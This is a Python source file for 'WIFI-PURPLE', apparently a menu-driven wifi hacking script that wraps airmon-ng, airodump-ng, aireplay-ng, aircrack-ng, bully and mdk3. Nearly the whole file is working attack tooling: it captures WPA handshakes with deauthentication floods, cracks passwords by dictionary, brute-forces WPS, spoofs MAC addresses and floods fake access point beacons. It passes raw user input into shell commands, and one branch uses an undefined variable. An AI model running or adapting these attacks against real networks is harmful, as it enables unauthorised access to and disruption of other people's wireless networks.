import os
import sys
import time
from subprocess import check_call
from colorama import Fore, Style

RED = '\033[1;31m'
BLUE = '\033[1;34m'
GREEN = '\033[1;32m'
YELLOW = '\033[1;33m'
MAGENTA = '\033[1;35m'
WHITE = '\033[1;37m'
CYAN = '\033[1;36m'
PURPLE = '\033[1;35m'
END = '\033[0m'

os.system("clear")


def banner():
    print("\033[1;35m" + """
 _    _ ___________ _____     ______ _   _____________ _      _____ 
| |  | |_   _|  ___|_   _|    | ___ \ | | | ___ \ ___ \ |    |  ___|
| |  | | | | | |_    | |______| |_/ / | | | |_/ / |_/ / |    | |__  
| |/\| | | | |  _|   | |______|  __/| | | |    /|  __/| |    |  __| 
\  /\  /_| |_| |    _| |_     | |   | |_| | |\ \| |   | |____| |___ 
 \/  \/ \___/\_|    \___/     \_|    \___/\_| \_\_|   \_____/\____/ 
			
	               \033[1;35m🌐--\033[1;35mBy EmreKybs\033[1;35m--🌐\033[0m
		
                 \033[1;35m\033[1;34mA Automate script for wifi hacking\033[1;35m\033[0m
					      				       
""" + "\033[0m")
def slowly(s):
    try:
        time.sleep(1)
        for char in s + '\n':
            sys.stdout.write(char)
            sys.stdout.flush()
            time.sleep(7. / 100)
        print('\n')
        time.sleep(2)
    except KeyboardInterrupt:
        time.sleep(1)
        slowly("\nExiting...")
        print('\n')
        sys.exit(0)

def menu():
    menu_items = [
        "Start Monitor Mode",
        "Stop Monitor Mode",
        "View Interfaces",
        "Restart Network",
        "Scan Networks",
        "Capture Handshake",
        "Crack the Password",
        "WPS Attack (Bully)",
        "FAKE MAC Address",
        "Fake Access Point",
    ]

    for index, item in enumerate(menu_items, start=1):
        print(f" \033[0;32m[\033[1;37m{index}\033[0;32m] \033[1;35m{item}\033[0m")

    print(" \033[1;32m[\033[1;37m0\033[1;32m] \033[1;35mExit\033[0m\n")

banner()
menu()


def bye():
    print("""
 \033[1;37m------------------------------------------------------\033[0m   

   	  \033[1;35m Thank you for using WIFI-PURPLE \033[0m
   	  
   	       	    \033[1;36m GOOD LUCK!\033[0m
          
             \033[1;32m https://github.com/emrekybs \033[0m

 \033[1;37m------------------------------------------------------\033[0m 

                                                   
"""+WHITE + Style.NORMAL)



############################################################

print(" \033[1;34mSelect Option: ")
WP = int(input(" \033[1;32m>> \033[1;37m"))

if WP == 1:
	os.system("clear")
	banner()
	print(" \033[1;37mEnter the interface: (\033[0;37mwlan\033[0;31m0 \033[1;37m| \033[0;37mwlan\033[0;34m1\033[1;37m)")
	interface = input(" \033[1;32m>> \033[0;37m")
	comand = "airmon-ng check kill && airmon-ng start {} ".format(interface)
	os.system(comand)
	os.system("python3 wifi-purple.py")

elif WP == 2:
    os.system("clear")
    banner()
    print(" \033[1;37mEnter the interface: (\033[0;37mwlan\033[0;31m0\033[0;37mmon \033[1;37m| \033[0;37mwlan\033[0;34m1\033[0;37mmon\033[1;37m)\033[0m")
    interface = input(" \033[1;32m>> \033[0;37m")
    comand = "airmon-ng stop {} ".format(interface)  
    os.system(comand)
    os.system("python3 wifi-purple.py")

elif WP in [3, 4, 5]:
    os.system("clear")

if WP == 3:
    print("\n\033[0m")
    os.system("sudo ifconfig")
    time.sleep(3)
    os.system("clear")
    os.system("python3 wifi-purple.py")

elif WP == 4:
    banner()
    slowly(" \033[1;37mRestarting the network, please wait...\033[0m")
    comand = "service NetworkManager stop && service NetworkManager start && airmon-ng check kill"
    os.system(comand)
    print(" \033[1;31mCompleted!\033[0m")
    time.sleep(2)
    os.system("clear")
    os.system("python3 wifi-purple.py")

if WP == 5:
    os.system("clear")
    banner()
    print(" \033[1;37mEnter the interface: (\033[0;37mwlan\033[0;31m0\033[0;37mmon \033[1;37m| \033[0;37mwlan\033[0;34m1\033[0;37mmon\033[1;37m)\033[0m")
    interface = input(" \033[1;32m>> \033[0;37m")
    comand = "airodump-ng {} -M --band abg".format(interface)
    print("\n \033[1;31m[Warning] \033[0;37mWhen finished, press \033[1;37mCTRL + C\033[0m")
    time.sleep(2)
    os.system(comand)
    time.sleep(2)
    os.system("clear")
    os.system("python3 wifi-purple.py") 

if WP in [6, 7]:
    os.system("clear")
    banner()

    if WP == 6:
        interface = input(" \033[1;37mEnter the interface you want to perform the scan on: (\033[0;37mwlan\033[0;31m0\033[0;37mmon \033[1;37m| \033[0;37mwlan\033[0;34m1\033[0;37mmon\033[1;37m) \033[1;32m>> \033[0;37m")
        comand = f"airodump-ng {interface} -M --band abg"
        print("\n \033[1;31m[Warning] \033[0;37mPress \033[1;37mCTRL + C\033[0m when finished")

        time.sleep(2)
        os.system(comand)
        
        bssid = input("\n Enter the \033[1;32mBSSID\033[0m of the target: \033[1;32m>> \033[0;37m")
        channel = int(input("\n Enter the \033[1;32mCHANNEL\033[0m of the target: \033[1;32m>> \033[0;37m"))
        ruta = input("\n Enter the \033[1;32mPATH\033[0m to save the handshake: \033[1;32m>> \033[0;37m")
        paquetes = int(input("\n Enter the number of packets (maximum 10000 | minimum 0): \033[1;32m>> \033[0;37m"))

        comand = f"airodump-ng -c {channel} --bssid {bssid} -w {ruta} {interface} | xterm -e aireplay-ng -0 {paquetes} -a {bssid} {interface}"
        os.system(comand)
        time.sleep(2)

    elif WP == 7:
        ruta = input(" \033[1;37mEnter the handshake file: \033[1;32m>> \033[0;37m")
        print("")
        dictionary = input(" \033[1;37mEnter the dictionary you want to use: \033[1;32m>> \033[0;37m")
        comand = f"aircrack-ng {ruta} -w {dictionary} -0"
        os.system(comand)
        exit()



if WP in [8, 9]:
    os.system("clear")
    banner()

    if WP == 8:
        os.system("clear")
        banner()

        print(" \033[1;37mEnter the BSSID of the wireless access point (AP):")
        bssid = input(" \033[1;32m>> \033[0;37m")
        print(" \033[1;37mEnter the channel of the wireless access point (AP):")
        channel = input(" \033[1;32m>> \033[0;37m")
        print(" \033[1;37mEnter the ESSID of the wireless access point (AP):")
        essid = input(" \033[1;32m>> \033[0;37m")
        comand = f"bully {interface} -b {bssid} -c {channel} -e {essid} --force"
        os.system(comand)

    elif WP == 9:
        print(" \033[1;37mEnter the interface you want to change: (\033[0;37mwlan\033[0;31m0 \033[1;37m| \033[0;37mwlan\033[0;34m1\033[1;37m)")
        interface = input(" \033[1;32m>> \033[0;37m")
        nuevaMAC = input("Enter the new MAC address: \033[1;32m>> \033[0;37m")
        os.system(f"ifconfig {interface} down")
        print(f"Changing the MAC address of {interface} to {nuevaMAC}")
        os.system(f"ifconfig {interface} hw ether {nuevaMAC}")
        print(f"MAC address changed to: {nuevaMAC}")
        os.system(f"ifconfig {interface} up")
        print("Interface is ready!")
        time.sleep(1)

        os.system(f"ifconfig {interface}")
        time.sleep(4)
        os.system("clear")
        os.system("python3 wifi-purple.py")


if WP == 10:
    os.system('clear')
    banner()
    interface = input(" \033[1;37mEnter the interface for wireless attack: (\033[0;37mwlan\033[0;31m0 \033[1;37m| \033[0;37mwlan\033[0;34m1\033[1;37m) \033[1;32m>> \033[0;37m")
    channel = input(" \033[1;37mEnter the channel: \033[1;32m>> \033[0;37m")
    crearDic = input(" \033[1;37mDo you want to create a fake AP (Access Point) dictionary? [\033[1;32my\033[0m/\033[1;31mn\033[0m] \033[1;32m>> \033[0;37m")

    if crearDic == 'y':
        os.system('sudo bash AP_config.sh')
    elif crearDic == 'n':
        pass

    dictionary = input("\n\033[1;37mEnter the path of the dictionary file (default: /wordlist/fakeAP.txt): \033[1;32m>> \033[0;37m")
    print("\n \033[1;31m[Warning] \033[0;37mTo stop the attack, press \033[1;37m\033[1;37mCTRL + C \033[0;37mkeys\033[0m")
    os.system(f"mdk3 {interface} b -f {dictionary} -a -s 1000 -c {channel}")

    time.sleep(2)   

elif WP == 0:
    os.system("clear")
    bye()
    exit()
